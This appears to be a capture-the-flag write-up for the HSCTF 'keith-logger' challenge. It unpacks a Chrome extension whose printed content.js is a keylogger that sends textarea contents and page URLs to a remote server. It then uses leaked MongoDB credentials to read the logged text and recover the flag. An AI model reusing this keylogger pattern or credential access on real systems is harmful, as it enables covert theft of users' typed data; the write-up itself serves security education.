We are given a chrome extension [file](./data/extension.crx). Chrome extenion is nothing but a zip file.
```
$ unzip extension.crx
Archive:  extension.crx
warning [extension.crx]:  593 extra bytes at beginning or within zipfile
  (attempting to process anyway)
  inflating: jquery-3.3.1.min.js     
  inflating: manifest.json           
  inflating: content.js

$ cat content.js
var timeout_textarea;
var xhr_textarea;

$("textarea").on("keyup", function() {
  if (timeout_textarea) {
    clearTimeout(timeout_textarea);
  }

  if (xhr_textarea) {
    xhr_textarea.abort();
  }

  timeout_textarea = setTimeout(function() {
    var xhr = new XMLHttpRequest();
    /*
    xhr.open(
      "GET",
      "https://keith-logger.web.chal.hsctf.com/api/record?text=" +
        encodeURIComponent($("textarea").val()) +
        "&url=" + encodeURIComponent(window.location.href),
      true
    );*/


    // send a request to admin whenever something is logged, not needed anymore after testing
    /*
    xhr.open(
      "GET",
      "https://keith-logger.web.chal.hsctf.com/api/admin",
      true
    );*/

    xhr.send();
  }, 2000);
});
```
Nice, we got a commented out `/api/admin` url. Let's give it a visit.
```
$ curl https://keith-logger.web.chal.hsctf.com/api/admin
didn't have time to implement this page yet. use admin:keithkeithkeith@keith-logger-mongodb.web.chal.hsctf.com:27017 for now
```
Great, credentials for a mongodb server.
```
$ mongo -u admin -p keithkeithkeith keith-logger-mongodb.web.chal.hsctf.com:27017/admin
MongoDB shell version v3.6.4
connecting to: mongodb://keith-logger-mongodb.web.chal.hsctf.com:27017/admin
MongoDB server version: 4.0.10
WARNING: shell and server versions do not match
> show databases;
database  0.000GB
> use database;
switched to db database
> db.getCollection('collection').find({})
{ "_id" : ObjectId("5cf0512d464d9fe1d9915fbd"), "text" : "are kitties cool", "url" : "https://keith-logger.web.chal.hsctf.com/", "time" : "21:54:53.925045" }
{ "_id" : ObjectId("5cf051a95501f2901a915fbd"), "text" : "because i think they are", "url" : "https://keith-logger.web.chal.hsctf.com/", "time" : "21:56:57.974856" }
{ "_id" : ObjectId("5cf051b3464d9fe1d9915fbe"), "text" : "meow! :3", "url" : "https://keith-logger.web.chal.hsctf.com/", "time" : "21:57:07.295378" }
{ "_id" : ObjectId("5cf0520b464d9fe1d9915fbf"), "text" : "meow! :3", "url" : "https://keith-logger.web.chal.hsctf.com/", "time" : "21:58:35.030635" }
{ "_id" : ObjectId("5cf05212464d9fe1d9915fc0"), "text" : "if you're looking for the flag", "url" : "https://keith-logger.web.chal.hsctf.com/", "time" : "21:58:42.170470" }
{ "_id" : ObjectId("5cf0521b5501f2901a915fbe"), "text" : "it's hsctf{watch_out_for_keyloggers}", "url" : "https://keith-logger.web.chal.hsctf.com/", "time" : "21:58:51.359556" }
```
Flag - hsctf{watch_out_for_keyloggers}
